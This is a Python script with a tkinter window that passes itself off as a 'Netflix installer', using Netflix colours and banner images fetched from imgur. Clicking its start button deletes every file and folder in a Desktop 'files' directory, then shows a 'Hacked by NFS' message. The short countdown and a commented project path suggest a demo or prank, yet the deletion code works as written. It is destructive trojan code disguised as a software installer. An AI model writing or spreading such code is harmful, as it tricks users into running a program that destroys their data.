import tkinter.font as font, requests, time, shutil, os, jsons, tkinter as tk, random, pyautogui
from tkinter import messagebox, CENTER, Tk, Canvas, Button, Label, PhotoImage, SUNKEN
from PIL import ImageTk, Image
import urllib.request, os

# Variables
backgroundcolor = "#000"
netflixcolor = "#e50914"
netflixcolordarker = "#ba121b"
# Folder where the files are located
# FILES_FOLDER = "C:\\wamp64\\www\\projects\\covid.py\\back\\files\\"
FILES_FOLDER = os.path.expanduser('~') + "\\Desktop\\files\\"
# Countdown in seconds
COUNTDOWN = 2# 1800 # 30 minutes
# Window size
WINDOW_WIDTH = 800
WINDOW_HEIGHT = 600


# Functions
def handle_click():
    files = os.listdir(FILES_FOLDER)

    # function call
    # countdown(COUNTDOWN)

    for file in range(0, len(files)):
        # Delete a random file from the list
        chemin_fichier = FILES_FOLDER + files[file]

        if os.path.exists(chemin_fichier):
            if os.path.isfile(chemin_fichier):
                os.remove(FILES_FOLDER + files[file])
                print(f"Le chemin {chemin_fichier} pointe vers un fichier valide.")
            else:
                shutil.rmtree(chemin_fichier)
                print(f"Le chemin {chemin_fichier} pointe vers un répertoire.")
        else:
            print(f"Le chemin {chemin_fichier} n'existe pas.")
        time.sleep(2)

    messagebox.showinfo("Hacked by NFS", "Vos fichiers ont bien été supprimé !")

def center(win):
    """
    centers a tkinter window
    :param win: the main window or Toplevel window to center
    """
    win.update_idletasks()
    width = 1200
    frm_width = win.winfo_rootx() - win.winfo_x()
    win_width = width + 2 * frm_width
    height = 600
    titlebar_height = win.winfo_rooty() - win.winfo_y()
    win_height = height + titlebar_height + frm_width
    x = win.winfo_screenwidth() // 2 - win_width // 2
    y = win.winfo_screenheight() // 2 - win_height // 2
    win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
    win.deiconify()

def init_landing():
    # Window configuration
    window = Tk()
    window.title("Netflix installer (v6.98.1805.0)")
    window.configure(background = backgroundcolor)
    buttonfont = font.Font(family = "Helvetica")
    center(window)

    # Add banner image
    urllib.request.urlretrieve(
        'https://i.imgur.com/1HECSrt.jpg',
        "bg.jpg"
    )
    urllib.request.urlretrieve(
        'https://i.imgur.com/0QCLm3v.png',
        "btn-idle.png"
    )
    urllib.request.urlretrieve(
        'https://i.imgur.com/WkAAEoR.png',
        "btn-hover.png"
    )
    img = Image.open("bg.jpg")
    img = img.resize((1080, 338), Image.Resampling.LANCZOS)
    tkimage = ImageTk.PhotoImage(img)
    imagebox = Label(window, image = tkimage, borderwidth = 0)

    # Define images button
    img1 = Image.open("btn-idle.png")
    img2 = Image.open("btn-hover.png")
    image_a = ImageTk.PhotoImage(img1)
    image_b = ImageTk.PhotoImage(img2)

    def onenter(e):
        startbutton["image"] = image_b

    def onleave(e):
        startbutton["image"] = image_a

    # Add button
    startbutton = Button(
        master = window,
        image = image_a, 
        border=0,
        borderwidth=0,
        cursor="hand2",
        background=backgroundcolor,
        activebackground=backgroundcolor,
        command = handle_click,
        relief=SUNKEN
    )

    startbutton.bind("<Enter>", onenter)
    startbutton.bind("<Leave>", onleave)
    startbutton.place(x=100, y=500)

    imagebox.pack()
    startbutton.pack(padx=100, pady=100)

    window.mainloop()

init_landing()